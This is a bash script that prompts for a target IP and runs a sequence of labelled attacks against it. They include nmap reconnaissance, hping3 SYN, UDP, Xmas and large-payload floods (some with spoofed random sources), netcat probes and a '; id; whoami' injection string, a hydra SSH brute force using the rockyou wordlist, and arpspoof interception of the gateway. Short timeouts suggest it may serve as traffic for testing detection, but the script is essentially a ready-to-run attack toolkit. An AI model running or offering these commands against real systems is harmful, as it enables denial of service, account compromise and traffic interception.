
#!/bin/bash

# Manual input for target IP
read -p "Enter Target IP Address: " TARGET

echo "+++++++ A. Reconnaissance Attacks +++++++"

nmap $TARGET
nmap -A -T4 $TARGET
nmap -p- $TARGET
nmap -sC -sV $TARGET

 

echo "+++++++ B. Network-Based Attacks +++++++"

timeout 5 ping -f $TARGET

timeout 5 ping -f $TARGET

echo "+++++++ C. SYN Flood +++++++"

timeout 5 hping3 -S --flood -p 445 $TARGET



echo "+++++++ UDP Flood +++++++"

timeout 5 hping3 --udp --flood -p 53 $TARGET



echo "+++++++ heavy payload flood +++++++"

timeout 5 sudo hping3 -S --flood -d 1200 $TARGET



echo "+++++++ the Xmas flood +++++++"

timeout 5 sudo hping3 -X --flood --rand-source -d 1200 $TARGET



echo "+++++++ UDP Bandwidth Flood +++++++"
 
timeout 5 sudo hping3 --udp --flood -d 1400 -p 53 $TARGET



echo "+++++++ D. Port-Based Attacks +++++++"
 
nc $TARGET 22

nc $TARGET 902



echo "+++++++ E. Payload-Based Attacks +++++++"

echo "malware attack exploit" | nc $TARGET 80
echo "malware attack exploit" | nc -v -w 2 $TARGET 80



echo "+++++++ 1. Send the Payload +++++++"

echo "malware attack exploit" | nc -v -w 2 $TARGET 80



echo "+++++++ 2. Test for Injection Vulnerabilities +++++++"

echo "; id; whoami" | nc $TARGET 80



echo "+++++++ 3. Identify the Service (Banner Grabbing) +++++++"

printf "HEAD / HTTP/1.1\r\nHost: $TARGET\r\n\r\n" | nc -v $TARGET 80



echo "+++++++ 4.  Check Port 902 +++++++"

echo "test" | nc -v $TARGET 902



echo "+++++++ E. Brute Force Attacks +++++++"

hydra -l bala -P /usr/share/eaphammer/wordlists/rockyou.txt -t 4 ssh://$TARGET



echo "+++++++ G. DNS Attacks +++++++"

timeout 5 hping3 --udp -p 53 --flood $TARGET



echo "+++++++ H. ARP Spoofing (MITM Simulation) +++++++"

timeout 10 arpspoof -t $TARGET 192.168.1.1
